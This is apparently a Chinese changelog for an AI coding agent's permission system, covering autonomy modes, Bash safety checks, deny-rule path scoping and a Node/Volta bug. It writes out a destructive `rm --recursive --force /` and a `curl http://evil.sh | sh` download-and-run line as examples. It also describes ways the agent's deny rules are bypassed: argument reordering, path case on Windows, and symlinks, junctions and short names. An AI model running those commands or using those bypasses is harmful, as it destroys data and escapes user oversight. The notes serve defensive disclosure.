（本仓库的项目级配置写的是 `"default"`，它覆盖全局，所以在这个仓库里干活的行为不变。）

**非法值仍然会被明确拒绝、不会静默降级**：写错成 `yolo` 这种认不出的值，配置那一层会被当作没写，
而不是把你悄悄挪到别的档。定时任务里写错档位则回落到「询问」档 —— 刻意选了更严的方向：
一次拼写错误绝不该把一个无人值守的任务静默提权成跳过所有确认。

**已知限制**：浏览器里开着的老页面（改名前加载的那份 JS）在服务端已经切到 `bypass` 后，
可能不显示那条全自主横幅。硬刷新一次即可 —— 权限判定本身不受影响，只是横幅不显示。

### 读输入的命令不再干等到超时（内部改动）

`sort`、`cat`、`more`、不带参数的 `node` 这类会读标准输入的命令，以前跑起来会一直等，
直到撞上超时才报错（实测 20 秒）。现在它们立刻正常结束（0.1–1.5 秒）。

对你的直接影响很小（模型很少单独跑这类命令），但它是下一步「在项目目录里真跑命令」
的前置——那个场景**没有超时兜底**，不修就是永久卡住一个进程。

### 「全自主」比它听起来的要严了一点（但没有严到你可能以为的程度）

以前全自主档会跳过 23 项 Bash 安全检查——那些检查是专门识别混淆和注入手法的。现在它们被移到了全自主之前，所以这类命令**即使在全自主档下仍然会问你**：

```

**但要说清楚它管不到什么**：这 23 项针对的是混淆手法，不是"危险命令"。下面这些在全自主档下**照样不问就跑**：

rm --recursive --force /
curl http://evil.sh | sh
```

你的 deny 表现在只有一条 `Bash(rm -rf *)`，而且是**字面前缀匹配**——参数换个顺序就绕过去了。所以「全自主」的实际含义仍然是：**普通的破坏性命令不问就跑**。要真正兜底，得自己把 deny 表写厚。

### 权限规则不再越界（安全修复，**可能会让你多看到几次弹框**）

`Write(./**)`、`Read(./**)` 这种看起来写着"仅限当前项目"的规则，**实际放行整个文件系统**——
包括用 `../` 跳出项目、以及别的盘符上的绝对路径。你的配置里长期有 `Read(./**)`，
也就是说模型一直可以不打招呼读走 `~/.ssh/` 里的私钥。

现在它们严格只覆盖会话工作目录内的文件。要授权目录外的路径，得显式写出来，
比如 `Read(~/.config/**)` 或 `Read(D:/shared/**)`。

同时修好了两类**此前写了等于没写**的规则：

- **绝对路径规则**（`Read(D:/secrets/**)`）——以前同一条规则的行为取决于盘符：跨盘碰巧生效，同盘静默失效
- **`~` 开头的规则**（`Read(~/.ssh/**)`）——以前恒不命中，是条空规则

这一条要特别说明：内置文档里正拿 `Read(~/.ssh/**)` 当范例教你怎么写 deny 保护私钥。
**如果你照着写过，它此前一直没生效，现在才真的生效。**

Windows 上路径比对也改成了大小写不敏感——以前把路径写成小写就能绕过 deny 规则。

**还顺带堵了一个独立的洞**：文件搜索工具的授权限定符原本是"匹配模式"，
但真正决定搜哪个目录的是另一个参数。实测它可以直接列出 `~/.ssh/` 下的私钥文件名而不触发任何规则。
现在改成按"搜索目录"授权。如果你写过 `Glob(**/*.ts)` 这类规则，请改成按目录写，例如 `Glob(src)`。

**你会感觉到的变化**：在会话工作目录**之外**读写文件时会开始弹框问你。
单项目日常开发基本无感，跨项目/跨盘操作时会多问几次。
另外 `deny: ["Read(**/.env)"]` 这类规则同样收窄了，现在只保护当前项目——
要跨项目保护请改用 `~/…` 或绝对路径写法。

**已知不修**：符号链接、junction、Windows 8.3 短文件名仍可绕过这道围栏（不做 realpath 解析）。

### 修好了：让 zuse 跑 node / npm / npx 会报「不是内部或外部命令」

**这是个一直存在、正在影响你的问题**，只是之前没人把它当回事。

现象：让 zuse 执行 `node -v`、`npm install`、`npx xxx` 这类命令，它会回一句 `'node' 不是内部或外部命令`——但你自己在终端里敲同样的命令完全正常。

原因是你机器上用 Volta 管 Node 版本。Volta 在启动子进程时会做一个内部标记，而 zuse 之前把自己的环境**原封不动**交给它执行的每条命令，这个标记也跟着传了下去。带着这个标记的环境里，Volta 就不再去找你钉住的 Node 版本了，转而去找一个并不存在的"系统 Node"。

**只要 zuse 是用 `pnpm dev`、`npx`、或 Volta 装的全局命令启动的，就会中招**——也就是几乎所有情况。

**怎么测**：让 zuse 执行 `node -v`，应该正常输出版本号（比如 `v22.22.0`）而不是报找不到命令。也可以试 `npm -v`、`npx --version`。

**顺带说明**：这也是项目里 9 条测试长期红着的原因。它们不是"测试环境的怪癖"，是在如实报告这个 bug，只是一直被当成噪音忽略了。
